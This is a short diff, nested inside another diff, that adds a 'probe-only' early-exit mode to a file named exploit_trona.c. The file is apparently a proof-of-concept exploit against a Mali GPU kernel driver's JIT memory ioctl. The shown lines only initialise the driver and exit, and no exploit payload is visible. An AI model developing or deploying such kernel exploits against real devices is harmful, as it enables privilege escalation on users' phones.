@@ -1,0 +1,14 @@
+diff --git a/poc-28663/exploit_trona.c b/poc-28663/exploit_trona.c
+index 11fdb1d..9a14bc7 100644
+--- a/poc-28663/exploit_trona.c
++++ b/poc-28663/exploit_trona.c
+@@ -900,3 +900,9 @@ int main(int argc, char **argv)
+ 	ji.trim_level = 100;
+ 	if (ioctl(fd, KBASE_IOCTL_MEM_JIT_INIT, &ji) < 0) { perror("JIT_INIT"); return 1; }
+ 	printf("[*] init ok (UAPI %d.%d), enforce=%c\n", vc.major, vc.minor, read_enforce());
++	if (argc > 2 && !strcmp(argv[2], "probe")) {
++		printf("[+] probe-only startup passed; no JIT region allocated\n");
++		close(fd2);
++		close(fd);
++		return 0;
++	}
